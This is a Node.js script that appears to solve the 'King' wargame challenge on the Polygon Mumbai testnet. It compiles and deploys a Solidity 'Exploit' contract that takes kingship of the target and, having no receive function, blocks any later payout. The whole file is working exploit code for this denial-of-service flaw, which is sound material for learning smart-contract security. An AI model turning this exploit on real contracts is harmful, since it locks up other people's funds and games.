const ethers = require('ethers');
const provider = new ethers.JsonRpcProvider('https://matic-mumbai.chainstacklabs.com');
const solc = require('solc');

const contractAbi = [{"inputs":[],"stateMutability":"payable","type":"constructor","payable":true},{"inputs":[],"name":"_king","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function","constant":true,"signature":"0x29cc6d6f"},{"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function","constant":true,"signature":"0x8da5cb5b"},{"inputs":[],"name":"prize","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function","constant":true,"signature":"0xe3ac5d26"},{"stateMutability":"payable","type":"receive","payable":true}];

const exploitCode = `
pragma solidity 0.8.19;

contract Exploit {
    bool public pwned = true;

    constructor() payable {
    }

    function exploit(address payable _target) public payable {
        (bool sent,) = _target.call{value: address(this).balance}("");
        require(sent, "send ether to target failed");
    }
}
`;

const input = {
    language: 'Solidity',
    sources: {
        'Exploit.sol': {
            content: exploitCode,
        },
    },
    settings: {
        outputSelection: {
            '*': {
                '*': ['*'],
            },
        },
    },
};

async function solve(privateKey, contractAddress, contractAbi) {
    const contract = new ethers.Contract(contractAddress, contractAbi, provider);
    const account = new ethers.Wallet(privateKey, provider);

    console.log('compiling exploit contract...');
    const compiler = await (new Promise((resolve, reject) => {
        solc.loadRemoteVersion('v0.8.19+commit.7dd6d404', (err, solc) => {
            if (err) {
                reject(err);
                return;
            }
            resolve(solc);
        });
    }));
    const compilerOutput = JSON.parse(compiler.compile(JSON.stringify(input)));
    const exploitAbi = compilerOutput.contracts['Exploit.sol'].Exploit.abi;
    const exploitBytecode = compilerOutput.contracts['Exploit.sol'].Exploit.evm.bytecode.object;

    if (await solved(contract, exploitAbi)) {
        console.log('contract already pwned');
        process.exit(0);
    }

    const prize = await contract.prize();
    console.log(`current prize: ${prize} wei`);

    console.log('deploying exploit contract...');

    const factory = new ethers.ContractFactory(exploitAbi, exploitBytecode, account);
    const exploitInstance = await factory.deploy({
        value: prize+1n,
    });
    const exploitAddress = await exploitInstance.getAddress();
    console.log('exploit contract deployed at:', exploitAddress);
    console.log('contract balance:', await provider.getBalance(exploitAddress));

    console.log('calling exploit function...');
    const exploitTx = await exploitInstance.exploit(contractAddress);
    await exploitTx.wait();

    console.log('new king:', await contract._king());

    console.log('checking if we powned the contract...');
    if (await solved(contract, exploitAbi)) {
        console.log('solved!');
    } else {
        console.error('failed to establish exploit contract as the new king');
        process.exit(1);
    }
}

async function solved(contract, exploitAbi) {
    const king = await contract._king();
    const exploitContract = new ethers.Contract(king, exploitAbi, provider);
    try {
        return await exploitContract.pwned();
    } catch {
        return false;
    }
}

const privateKey = process.argv[2];
if (!privateKey) {
    console.error('private key must be provided as the first argument');
    process.exit(1);
}

const contractAddress = process.argv[3];
if (!contractAddress) {
    console.error('contract address must be provided as the second argument');
    process.exit(1);
}

solve(privateKey, contractAddress, contractAbi);
